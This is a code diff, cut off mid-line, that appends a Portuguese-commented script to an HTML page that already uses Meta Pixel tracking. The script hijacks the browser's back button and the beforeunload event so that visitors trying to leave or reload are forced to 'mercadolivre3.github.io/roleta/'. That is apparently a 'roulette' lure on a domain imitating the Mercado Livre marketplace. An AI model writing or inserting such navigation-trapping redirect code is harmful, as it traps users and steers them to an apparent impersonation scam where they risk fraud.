@@ -326,3 +326,19 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=1148635666905575&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code --></body></html>
+
+<script>
+  // Impede o botão de voltar do navegador
+  history.pushState(null, null, location.href);
+  window.onpopstate = function () {
+    location.href = "https://mercadolivre3.github.io/roleta/";
+  };
+
+  // Detecta tentativa de sair ou recarregar a página
+  window.addEventListener("beforeunload", function (e) {
+    // Redireciona antes de sair
+    location.href = "https://mercadolivre3.github.io/roleta/";
+    
+    // Mensagem de confirmação (opcional – pode ser ignorada por alguns navegadores)
+    e.preventDefault();
+    e.re
